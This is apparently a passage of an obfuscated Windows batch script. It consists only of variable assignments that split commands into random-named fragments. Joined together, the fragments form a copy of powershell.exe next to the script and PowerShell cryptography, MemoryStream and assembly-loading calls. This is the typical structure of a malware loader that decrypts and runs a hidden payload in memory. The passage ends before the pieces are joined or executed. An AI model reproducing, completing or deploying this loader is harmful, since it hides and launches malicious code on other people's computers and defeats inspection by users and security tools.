@echo off
set "weDKvBHgYB=st"
set "KXJkkvWJwM= C"
set "uBkanPDAwl=Po"
set "HQOmyjvuCz=rS"
set "ICEZEKhGof=em"
set "cANlcjpFvn=\W"
set "FJFFwhQZsU=ll"
set "mvwPoQBzRj=do"
set "EprDzrGaEB=co"
set "IFDdTmMZJq=32"
set "bmgiytsWMg=rs"
set "XnTxfecfnf=we"
set "DtERChIGio=y "
set "NNDZAsGBMr= /"
set "RSccHHElZy=in"
set "BiRJvdQDQA=po"
set "RzNyDclXOR=:\"
set "dPvKNDMXCe=\v"
set "ylYIGUkMyS=Wi"
set "EIUGjocIlc=.e"
set "nacFBnImCT=ll"
set "EZhMBzQfIn=py"
set "KTRJKtbBTU=xe"
set "DxxdEHFgtd=nd"
set "TloEeKlvBz=he"
set "OIxHzhOsWv=ws"
set "vXDRKelIiy=ow"
set "uJxyYGNiLk=0\"
set "kjkEitcKUW=Sy"
set "HBZkeGeYXl=we"
set "nTqROzZaDp=s\"
set "tiYXrvmvgu=1."
set "PDmrDkrpBo=he"
set "UlIkekpwCX= %~dp0"
set "VAMcibzqrX=cd"
set "zwyqCOtrXg=.Mem"
set "YuXTxoGuWd=ypto"
set "QcGBOhoEIU=morF"
set "mUPFToMUMW=Syst"
set "dUySOqeBVR=Fina"
set "HqEhxgAJJg=grap"
set "sWfgbDTHJn=s.En"
set "QQpIsfGBlX=Rs ="
set "pbhKFjJULn=ach "
set "RtOKRNpPYi=L4Yi"
set "lDPKRhJtOg=[Sys"
set "rzuBkHjiws=);$r"
set "GPBuwZJqfG=-Obj"
set "FcCiFhwWbw=]::("
set "qiugJfPGBz=Disp"
set "QSsnTDxCbN=onve"
set "rePIMbsIEX=RmAx"
set "jLFHpozSJO=-joi"
set "HnYAIvXRTW=-4] "
set "GkHMjUrpZt=IOg "
set "ERyZDLPCzI=e]::"
set "tWzmKePlrQ=$ehM"
set "DgoKmlGPTp=O.Me"
set "LlpBbdWUOj=Syst"
set "JLdqrSXndi=ss -"
set "fCDFRIsRoS=Og.T"
set "KGQujOJHFP=rtS4"
set "IwWszbVaiT=lBlo"
set "xGlMvOEsin=k = "
set "UoWLNwEWgO=rity"
set "clxjCfyfqt=eam("
set "dOCVCYMCIK=Stre"
set "EGSDIfKbsv=[IO."
set "oPwQCuCBLq=nirt"
set "CvqMzXjolI=s = "
set "LLlPEzcSwr=Hm ="
set "SdNOqEWEoQ=am;$"
set "KQgYwLtkUh=rity"
set "eCBZLzlKYT=comm"
set "rfCdlJtOoF= '')"
set "QJOBAiwmPs=embl"
set "rBHuUsNnNt=esMa"
set "AakfRmTzND=ni);"
set "wdgflvjmuB=IOg."
set "ZDwbqraSam=yste"
set "YHYRJaljOc=Disp"
set "badfBdCchU=crsR"
set "ZXwZCenZSU=  $M"
set "DWpnhsbQFO=d;$V"
set "VoOMbLsruZ=, (,"
set "WSQCmBdaqf=gjYA"
set "uyKMvgJNgV=raph"
set "gcZMnEFlRL=zSvd"
set "BHBBOiQcCX= New"
